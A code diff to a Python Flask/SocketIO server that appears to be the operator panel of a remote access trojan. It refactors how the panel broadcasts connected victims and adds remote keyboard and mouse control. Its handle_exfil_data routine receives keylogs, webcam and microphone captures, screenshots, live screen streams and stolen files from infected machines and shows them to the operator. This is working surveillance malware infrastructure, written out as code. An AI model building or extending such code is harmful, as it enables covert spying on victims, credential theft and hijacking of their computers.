@@ -37,7 +37,16 @@ def index():
     """Render the main dashboard if the user is logged in, otherwise redirect to login."""
     if not session.get('logged_in'):
         return redirect(url_for('login'))
-    return render_template('index.html')
+    # Prepare initial client list for the template
+    client_list = [
+        {
+            'id': cid,
+            'system': info,
+            'activity': client_activity.get(cid, {'status': 'idle'})
+        }
+        for cid, info in client_info.items()
+    ]
+    return render_template('index.html', clients=client_list)
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -98,6 +107,8 @@ def handle_client_connect():
     """Handle new client connections in the /client namespace."""
     print(f"[*] Client connected: {request.sid} on /client namespace")
     client_activity[request.sid] = {"last_active": time.time(), "status": "active"}
+    # Update frontend with new client list
+    broadcast_client_info()
 
 @socketio.on('disconnect', namespace='/client')
 def handle_client_disconnect():
@@ -107,15 +118,7 @@ def handle_client_disconnect():
         del client_info[request.sid]
     if request.sid in client_activity:
         del client_activity[request.sid]
-    client_info_list = [
-        {
-            'id': cid,
-            'system': info,
-            'activity': client_activity.get(cid, {'status': 'idle'})
-        }
-        for cid, info in client_info.items()
-    ]
-    emit('client_info', client_info_list, broadcast=True, namespace='/client')
+    broadcast_client_info()
 
 @socketio.on('command', namespace='/client')
 def handle_client_command(data):
@@ -183,61 +186,61 @@ def handle_exfil_data(data):
                 client_info[client_id] = {}
             client_info[client_id]['username'] = username
 
-        emit('command_output', {
+        socketio.emit('command_output', {
             'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
             'client_id': client_id,
             'command': command,
             'output': output,
             'current_dir': current_dir
-        }, broadcast=True, namespace='/client')
+        }, broadcast=True, namespace='/')  # Emit to frontend in default namespace
 
     elif data_type == "network_data":
-        emit('network_data', {
+        socketio.emit('network_data', {
             'client_id': client_id,
             'timestamp': data.get('timestamp'),
             'bytes_sent': data.get('bytes_sent'),
             'bytes_recv': data.get('bytes_recv'),
             'sent_speed_mbps': data.get('sent_speed_mbps'),
             'recv_speed_mbps': data.get('recv_speed_mbps')
-        }, broadcast=True, namespace='/client')
+        }, broadcast=True, namespace='/')
 
     elif data_type == "system_data":
-        emit('system_data', {
+        socketio.emit('system_data', {
             'client_id': client_id,
             'timestamp': data.get('timestamp'),
             'cpu_usage_percent': data.get('cpu_usage_percent'),
             'memory_usage_mb': data.get('memory_usage_mb')
-        }, broadcast=True, namespace='/client')
+        }, broadcast=True, namespace='/')
 
     elif data_type == "webcam_data":
-        emit('webcam_data', {
+        socketio.emit('webcam_data', {
             'client_id': client_id,
             'image': data.get('image')
-        }, broadcast=True, namespace='/client')
+        }, broadcast=True, namespace='/')
 
     elif data_type == "mic_data":
-        emit('mic_data', {
+        socketio.emit('mic_data', {
             'client_id': client_id,
             'audio': data.get('audio')
-        }, broadcast=True, namespace='/client')
+        }, broadcast=True, namespace='/')
 
     elif data_type == "screenshot_data":
-        emit('screenshot_data', {
+        socketio.emit('screenshot_data', {
             'client_id': client_id,
             'image': data.get('image')
-        }, broadcast=True, namespace='/client')
+        }, broadcast=True, namespace='/')
 
     elif data_type == "screen_stream":
-        emit('screen_stream', {
+        socketio.emit('screen_stream', {
             'client_id': client_id,
             'image': data.get('image')
-        }, broadcast=True, namespace='/client')
+        }, broadcast=True, namespace='/')
 
     elif data_type == "keylog_data":
-        emit('keylog_data', {
+        socketio.emit('keylog_data', {
             'client_id': client_id,
             'logs': data.get('logs')
-        }, broadcast=True, namespace='/client')
+        }, broadcast=True, namespace='/')
 
     elif data_type == "file_download":
         filename = data.get('filename')
@@ -247,7 +250,11 @@ def handle_exfil_data(data):
             f.write(file_data)
         print(f"[*] Received file {filename} from client {client_id}")
 
-    # Update client info list and broadcast to all connected clients
+    # Update client info list and broadcast to all connected frontends
+    broadcast_client_info()
+
+def broadcast_client_info():
+    """Broadcast updated client info to all frontends in the default namespace."""
     client_info_list = [
         {
             'id': cid,
@@ -256,7 +263,27 @@ def handle_exfil_data(data):
         }
         for cid, info in client_info.items()
     ]
-    emit('client_info', client_info_list, broadcast=True, namespace='/client')
+    socketio.emit('client_info', client_info_list, broadcast=True, namespace='/')
+
+# --- SocketIO Event Handlers for Default Namespace (Frontend) ---
+@socketio.on('connect', namespace='/')
+def handle_frontend_connect():
+    """Handle frontend connections in the default namespace."""
+    print(f"[*] Frontend connected: {request.sid} on default namespace")
+    broadcast_client_info()
+
+@socketio.on('request_client_info', namespace='/')
+def handle_request_client_info():
+    """Handle frontend requests for client info."""
+    broadcast_client_info()
+
+@socketio.on('remote_input', namespace='/')
+def handle_remote_input(data):
+    """Forward remote input commands to the specified client."""
+    client_id = data.get('client_id')
+    input_data = json.loads(data.get('input_data'))
+    if client_id:
+        socketio.emit('remote_input', input_data, to=client_id, namespace='/client')
 
 # --- Main Entry Point ---
 if __name__ == '__main__':
